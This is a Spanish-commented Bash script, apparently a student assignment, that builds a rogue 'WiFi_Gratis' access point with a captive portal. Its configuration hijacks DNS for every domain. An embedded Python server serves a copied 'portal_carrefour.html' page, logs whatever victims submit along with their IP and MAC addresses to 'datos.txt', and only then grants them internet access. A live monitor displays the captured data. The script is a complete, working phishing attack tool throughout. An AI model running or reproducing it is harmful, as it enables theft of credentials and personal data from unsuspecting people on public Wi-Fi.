#!/bin/bash

# --- COMPROBACIÓN DE PRIVILEGIOS DE SUDO ---
if [ "$EUID" -ne 0 ]; then
    echo -e "\033[1;31m[!] ERROR: Este script requiere privilegios de superusuario.\033[0m"
    echo -e "\033[1;33m[*] Por favor, ejecútalo usando: sudo $0\033[0m"
    exit 1
fi

# --- VARIABLES DE ENTORNO ---
NC='\033[0m'; VERDE='\033[1;32m'; AZUL='\033[1;34m'; ROJO='\033[1;31m'; AMARILLO='\033[1;33m'; BOLD='\033[1m'

DIR_ACTUAL=$(pwd)
LOG_DATOS="$DIR_ACTUAL/datos.txt"
LEASES_FILE="$DIR_ACTUAL/victimas.leases"

BANNER="88888888ba   88888888ba,    I8,        8        ,8I    ,ad8888ba,    
88      \"8b  88      \`\"8b   \`8b        d8b        d8'   d8\"'    \`\"8b  
88      ,8P  88          \`8b   \"8,     ,8\"8,     ,8\"   d8'            
88aaaaaa8P'  88            88    Y8     8P Y8     8P    88            
88\"\"\"\"88'    88            88    \`8b   d8' \`8b   d8'    88      88888 
88    \`8b    88            8P     \`8a a8'    \`8a a8'      Y8,        88 
88     \`8b   88      .a8P          \`8a8'      \`8a8'        Y8a.    .a88 
88      \`8b  88888888Y\"'            \`8'        \`8'          \`\"Y88888P\" "

# --- FUNCIONES DE ESTÉTICA ---

escribir_maquina() {
    local texto="$1"
    local delay="${2:-0.01}"
    for (( i=0; i<${#texto}; i++ )); do
        echo -ne "${texto:$i:1}"
        sleep "$delay"
    done
    echo ""
}

barra_progreso() {
    local duracion=$1
    local texto=$2
    echo -ne "${AMARILLO}[*] $texto ${NC}"
    for ((i=0; i<=20; i++)); do
        echo -ne "${VERDE}█${NC}"
        sleep "$(bc -l <<< "$duracion/20")"
    done
    echo -e " ${VERDE}OK${NC}"
}

limpiar_terminal() { clear; stty sane; tput cup 0 0; }

mostrar_banner() {
    echo -e "${AZUL}${BANNER}${NC}"
    echo -e "${AZUL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# --- LÓGICA MEJORADA ---

comprobar_red() {
    limpiar_terminal
    mostrar_banner
    escribir_maquina "[*] Escaneando interfaces de red..." 0.02
    
    sudo airmon-ng check kill > /dev/null 2>&1
    interfaces=($(iw dev | awk '$1=="Interface" {print $2}'))
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${ROJO}[!] No se detectaron interfaces inalámbricas.${NC}"; sleep 2; return
    elif [ ${#interfaces[@]} -eq 1 ]; then
        IFACE_FINAL=${interfaces[0]}
        echo -e "${VERDE}[+] Interfaz detectada y seleccionada: ${AMARILLO}$IFACE_FINAL${NC}"
        sleep 1
    else
        echo -e "${AMARILLO}[!] Múltiples interfaces detectadas:${NC}"
        for i in "${!interfaces[@]}"; do echo -e "  $i) ${interfaces[$i]}"; done
        read -p " Seleccione índice >> " idx
        IFACE_FINAL=${interfaces[${idx:-0}]}
    fi
    export IFACE_FINAL
}

configurar_portal() {
    if [ -z "$IFACE_FINAL" ]; then comprobar_red; fi
    limpiar_terminal
    mostrar_banner
    echo -e "${AZUL}[ CONFIGURACIÓN DE RED ]${NC}"
    
    # Selección de SSID con Enter predeterminado
    read -p " SSID (Enter para 'WiFi_Gratis'): " mi_ssid
    mi_ssid=${mi_ssid:-WiFi_Gratis}
    
    # Selección de Canal con Enter predeterminado (6)
    read -p " Canal 1-13 (Enter para '6'): " mi_canal
    mi_canal=${mi_canal:-6}

    sudo mkdir -p /var/run/hostapd
    cat <<EOF > "$DIR_ACTUAL/hostapd.conf"
interface=$IFACE_FINAL
driver=nl80211
ssid=$mi_ssid
hw_mode=g
channel=$mi_canal
auth_algs=1
wmm_enabled=1
ctrl_interface=/var/run/hostapd
EOF

    # Cambiado el direccionamiento al rango 200.200.200.X solicitado por tu profesor
    cat <<EOF > "$DIR_ACTUAL/dnsmasq.conf"
interface=$IFACE_FINAL
dhcp-range=200.200.200.10,200.200.200.254,255.255.255.0,1h
dhcp-option=3,200.200.200.1
dhcp-option=6,200.200.200.1
address=/#/200.200.200.1
dhcp-leasefile=$LEASES_FILE
EOF

    cat <<EOF > "$DIR_ACTUAL/servidor_pro.py"
import http.server, socketserver, datetime, subprocess, urllib.parse

class Capturador(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        host_header = self.headers.get('Host', '')
        if host_header != "200.200.200.1":
            self.send_response(302)
            self.send_header("Location", "http://200.200.200.1/index.html")
            self.end_headers()
            return
        if self.path == "/" or self.path == "":
            self.path = "/index.html"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        ip_cliente = self.client_address[0]
        try:
            mac_cmd = f"arp -an {ip_cliente} | awk '{{print \$4}}'"
            mac_cliente = subprocess.check_output(mac_cmd, shell=True).decode().strip()
        except: mac_cliente = "Desconocida"
        fecha = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        datos_decoded = urllib.parse.unquote(post_data)
        with open("$LOG_DATOS", "a") as f:
            f.write(f"Fecha: {fecha} | MAC: {mac_cliente} | IP: {ip_cliente} | Datos: {datos_decoded}\\n")
        subprocess.run(f"sudo iptables -t nat -I PREROUTING -s {ip_cliente} -j ACCEPT", shell=True)
        subprocess.run(f"sudo iptables -I FORWARD -s {ip_cliente} -j ACCEPT", shell=True)
        
        # Mantiene la respuesta 204 para forzar el cierre del flujo en Samsung
        self.send_response(204)
        self.end_headers()

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", 80), Capturador) as httpd:
    httpd.serve_forever()
EOF
    FICHEROS_LISTOS=true
    barra_progreso 0.5 "Guardando parámetros..."
}

levantar_portal() {
    if [ "$FICHEROS_LISTOS" != true ]; then configurar_portal; fi
    limpiar_terminal
    mostrar_banner
    
    barra_progreso 0.6 "Limpiando interfaces..."
    sudo killall hostapd dnsmasq python3 2>/dev/null
    
    IFACE_INET=$(ip route | grep default | awk '{print $5}' | head -n1)
    # Cambiada IP de la interfaz local al rango 200.200.200.1
    sudo ifconfig $IFACE_FINAL up 200.200.200.1 netmask 255.255.255.0
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    mkdir -p "$DIR_ACTUAL/web_temp"
    [ -f "$DIR_ACTUAL/portal_carrefour.html" ] && cp "$DIR_ACTUAL/portal_carrefour.html" "$DIR_ACTUAL/web_temp/index.html"
    
    barra_progreso 0.8 "Enrutando tráfico..."
    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -P FORWARD DROP
    sudo iptables -A FORWARD -p udp --dport 53 -j ACCEPT
    sudo iptables -A FORWARD -p tcp --dport 53 -j ACCEPT
    sudo iptables -A FORWARD -d 200.200.200.1 -j ACCEPT
    sudo iptables -t nat -A PREROUTING -i $IFACE_FINAL -p tcp --dport 80 -j DNAT --to-destination 200.200.200.1:80
    sudo iptables -t nat -A POSTROUTING -o $IFACE_INET -j MASQUERADE
    
    barra_progreso 1.2 "Iniciando AP..."
    sudo hostapd "$DIR_ACTUAL/hostapd.conf" > /dev/null 2>&1 &
    sleep 2
    sudo dnsmasq -C "$DIR_ACTUAL/dnsmasq.conf" -d > /dev/null 2>&1 &
    cd "$DIR_ACTUAL/web_temp" && sudo python3 ../servidor_pro.py > /dev/null 2>&1 & cd ..
    
    echo -e "\n${VERDE}${BOLD}[✓] PORTAL EN LINEA (Subred: 200.200.200.X)${NC}"
    sleep 1
}

monitorizacion_separada() {
    cat <<EOF > .monitor.sh
#!/bin/bash
NC='\033[0m'; VERDE='\033[1;32m'; AZUL='\033[1;34m'; AMARILLO='\033[1;33m'; ROJO='\033[1;31m'; BOLD='\033[1m'
# Ocultamos el cursor para evitar parpadeo visual
tput civis
while true; do
    # Usamos tput cup para sobreescribir en lugar de clear total
    tput cup 0 0
    MACS=\$(sudo hostapd_cli -p /var/run/hostapd list_sta 2>/dev/null | grep -E '^([0-9a-fA-F]{2}:){5}' | awk '{print \$1}')
    NUM=\$(echo "\$MACS" | grep -v '^\$' | wc -l)
    echo -e "\${AZUL}======================================================================"
    echo -e "  MONITOR RDWG | DISPOSITIVOS CONECTADOS: \${AMARILLO}[ \$NUM ]\${NC}"
    echo -e "======================================================================\${NC}"
    echo -e "\n\${VERDE}[+] CLIENTES ASOCIADOS (Vía Hostapd):\${NC}"
    if [ -z "\$MACS" ]; then 
        echo -e "\${ROJO}Esperando asociaciones...\${NC}                      "
    else
        for mac in \$MACS; do
            ip=\$(grep -i "\$mac" "$LEASES_FILE" 2>/dev/null | awk '{print \$3}')
            echo -e "  > MAC: \${BOLD}\$mac\${NC} | IP: \${AMARILLO}\${ip:-Asignando...}\${NC}    "
        done
    fi
    echo -e "\n\${ROJO}[!] DATOS CAPTURADOS:\${NC}"
    if [ -f "$LOG_DATOS" ]; then
        tail -n 10 "$LOG_DATOS"
    else
        echo "Esperando datos..."
    fi
    sleep 1
done
EOF
    chmod +x .monitor.sh
    mate-terminal --title="MONITOR RDWG" -- bash -c "./.monitor.sh" > /dev/null 2>&1 &
}

detener_servicios() {
    limpiar_terminal
    mostrar_banner
    barra_progreso 1.0 "Deteniendo todos los servicios..."
    # Matamos todo de una vez
    sudo pkill hostapd 2>/dev/null
    sudo pkill dnsmasq 2>/dev/null
    sudo pkill -f servidor_pro.py 2>/dev/null
    sudo iptables -F && sudo iptables -t nat -F
    sudo iptables -P FORWARD ACCEPT
    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
    echo -e "${VERDE}[!] Servicios desactivados.${NC}"
    sleep 1
}

restaurar_y_salir() {
    limpiar_terminal
    mostrar_banner
    escribir_maquina "[*] Aplicando limpieza final..." 0.02
    detener_servicios
    sudo rm -rf "$DIR_ACTUAL/hostapd.conf" "$DIR_ACTUAL/dnsmasq.conf" "$DIR_ACTUAL/servidor_pro.py" "$DIR_ACTUAL/.monitor.sh" "$DIR_ACTUAL/victimas.leases" "$DIR_ACTUAL/web_temp"
    sudo systemctl restart NetworkManager
    echo -e "${VERDE}[!] Sistema limpio. Adiós.${NC}"
    exit 0
}

trap restaurar_y_salir SIGINT SIGTERM

# --- BUCLE PRINCIPAL ---
limpiar_terminal
echo -e "${AZUL}"
while IFS= read -r line; do
    echo -e "$line"
    sleep 0.03
done <<< "$BANNER"
echo -e "${NC}"
escribir_maquina "Cargando portal-wifi21..." 0.03
sleep 1

while true; do
    limpiar_terminal
    pgrep -x "hostapd" > /dev/null && EST="${VERDE}ON${NC}" || EST="${ROJO}OFF${NC}"
    mostrar_banner
    echo -e " IFACE: ${AMARILLO}${IFACE_FINAL:----}${NC} | STATUS: $EST"
    echo -e "${AZUL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e " 1) Escoger Interfaz"
    echo -e " 2) Configurar SSID/Canal"
    echo -e " 3) ${VERDE}ACTIVAR PORTAL${NC}"
    echo -e " 4) ${ROJO}DESACTIVAR${NC}"
    echo -e " 5) Monitorizar Clientes"
    echo -e " 6) Salir"
    echo -e "${AZUL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p " Opc >> " op
    case $op in
        1) comprobar_red ;;
        2) configurar_portal ;;
        3) levantar_portal ;;
        4) detener_servicios ;;
        5) monitorizacion_separada ;;
        6) restaurar_y_salir ;;
    esac
done
